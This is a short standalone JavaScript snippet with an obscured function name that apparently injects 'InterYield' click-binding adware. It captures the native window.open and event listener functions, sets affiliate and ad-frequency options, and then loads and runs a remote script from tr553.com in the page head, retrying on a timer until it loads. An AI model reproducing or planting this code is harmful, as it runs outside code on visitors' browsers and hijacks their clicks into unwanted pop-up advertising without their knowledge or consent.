
try {
 InterYieldNativeAddEventListener = window.addEventListener;
 InterYieldNativeWindowOpen = window.open;
} catch (e) { }
GtiMnPLrybXEfHp = function() {
try {
 InterYieldOptions= [{
   "e": "click",
   "debug": "false",
   "affiliate": "mrlmedia2",
   "subid": "DP2214AAAAAA",
   "ecpm": "2.03",
   "snoozeMinutes": "3",
   "maxAdCountsPerInterval": "6",
   "adCountIntervalHours": "24",
   "attributionLogo": "custom attribution",
   "attributionTitle": "custom attribution",
   "attributionLink": "custom attribution",
   "EndPoint": "https://interyield.jmp9.com",
   "CDNDomain": "https://www.tr553.com",
   "id": "RQRnQ",
   "id2": "QXDkm",
   "id3": "2f2bdb4cb0d492fd41d5daf0d7527ea7",
   "id4": "cztwc"
}] ;
 InterYieldScript = document.createElement("script");
 InterYieldScript.type = "text/javascript";
 InterYieldScript.src = "https://www.tr553.com/InterYield/clickbinder.do?ver=1.0-SNAPSHOT.49%2C790&a=null";
 document.getElementsByTagName("head")[0].appendChild(InterYieldScript);
 delete InterYieldScript;
} catch (e) { }
};

(function myLoop (i) {  
    setTimeout(function () {   
        if (typeof InterYieldOptions == "undefined" || InterYieldOptions == null ) {
            GtiMnPLrybXEfHp();
            return;
        }
        if (--i) myLoop(i);    
    }, 300)
})(30); 